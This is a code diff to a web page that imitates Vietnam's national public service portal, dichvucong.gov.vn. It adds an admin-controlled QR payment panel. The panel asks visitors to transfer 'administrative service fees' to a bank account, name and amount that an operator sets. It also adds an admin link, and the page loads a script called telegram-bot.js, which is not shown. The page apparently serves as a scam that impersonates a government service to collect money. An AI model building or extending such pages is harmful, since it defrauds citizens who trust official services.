@@ -335,6 +335,36 @@
         </div>
     </section>
 
+    <!-- QR Payment Section (controlled by Admin) -->
+    <section class="qr-payment-section" id="qrPaymentSection">
+        <div class="container">
+            <div style="text-align:center;margin-bottom:18px;">
+                <h2 id="qrSectionTitle" style="font-size:18px;font-weight:700;color:#c0392b;display:flex;align-items:center;justify-content:center;gap:8px;">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><path d="M14 14h.01M18 14h.01M14 18h.01M18 18h.01M18 10v.01"/></svg>
+                    Thanh toán phí dịch vụ
+                </h2>
+                <p style="font-size:13px;color:#888;margin-top:4px;">Quét mã QR bên dưới để hoàn tất thanh toán phí dịch vụ hành chính</p>
+            </div>
+            <div class="qr-payment-inner">
+                <div class="qr-payment-img">
+                    <img id="qrMainImg" src="" alt="QR Thanh toán">
+                </div>
+                <div class="qr-payment-info">
+                    <h3 id="qrInfoTitle">Thông tin thanh toán</h3>
+                    <div class="qr-payment-row"><span class="qr-payment-label">🏦 Ngân hàng:</span><span class="qr-payment-val" id="qrInfoBank">—</span></div>
+                    <div class="qr-payment-row"><span class="qr-payment-label">💳 Số tài khoản:</span><span class="qr-payment-val" id="qrInfoAccount">—</span></div>
+                    <div class="qr-payment-row"><span class="qr-payment-label">👤 Chủ tài khoản:</span><span class="qr-payment-val" id="qrInfoName">—</span></div>
+                    <div class="qr-payment-row" id="qrInfoAmountRow"><span class="qr-payment-label">💰 Số tiền:</span><span class="qr-payment-val" id="qrInfoAmount">—</span></div>
+                    <div class="qr-payment-row" id="qrInfoNoteRow"><span class="qr-payment-label">📝 Nội dung:</span><span class="qr-payment-val" id="qrInfoNote">—</span></div>
+                    <div class="qr-payment-row" id="qrInfoCodeRow"><span class="qr-payment-label">📋 Mã hồ sơ:</span><span class="qr-payment-val" id="qrInfoCode">—</span></div>
+                    <div class="qr-payment-notice">
+                        ⚠️ Vui lòng nhập đúng nội dung chuyển khoản để hồ sơ được xử lý nhanh chóng.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
     <!-- News Section -->
     <section class="news-section">
         <div class="container">
@@ -496,6 +526,7 @@
                     <p><strong>www.dichvucong.gov.vn</strong></p>
                     <p><strong>Tổng đài hỗ trợ:</strong> 18001096</p>
                     <p><strong>Email:</strong> dichvucong@chinhphu.vn</p>
+                    <a href="admin.html" class="admin-footer-link">⚙ Quản trị hệ thống</a>
                 </div>
             </div>
         </div>
@@ -506,6 +537,33 @@
 
     <script src="telegram-bot.js"></script>
     <script src="script.js"></script>
+    <script>
+        // ===== QR Payment Section =====
+        (function initQRSection() {
+            const config = JSON.parse(localStorage.getItem('adminQRConfig') || 'null');
+            if (!config || !config.url) return;
+            const section = document.getElementById('qrPaymentSection');
+            if (!section) return;
+            section.classList.add('visible');
+            document.getElementById('qrMainImg').src = config.url;
+            if (config.title) document.getElementById('qrInfoTitle').textContent = config.title;
+            if (config.bankLabel) document.getElementById('qrInfoBank').textContent = config.bankLabel;
+            if (config.account) document.getElementById('qrInfoAccount').textContent = config.account;
+            if (config.name) document.getElementById('qrInfoName').textContent = config.name;
+            const amountRow = document.getElementById('qrInfoAmountRow');
+            if (config.amount) {
+                document.getElementById('qrInfoAmount').textContent = parseInt(config.amount).toLocaleString('vi-VN') + ' VNĐ';
+            } else { amountRow.style.display = 'none'; }
+            const noteRow = document.getElementById('qrInfoNoteRow');
+            if (config.note) {
+                document.getElementById('qrInfoNote').textContent = config.note;
+            } else { noteRow.style.display = 'none'; }
+            const codeRow = document.getElementById('qrInfoCodeRow');
+            if (config.fileCode) {
+                document.getElementById('qrInfoCode').textContent = config.fileCode;
+            } else { codeRow.style.display = 'none'; }
+        })();
+    </script>
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             const prevBtn = document.getElementById('newsPrevBtn');
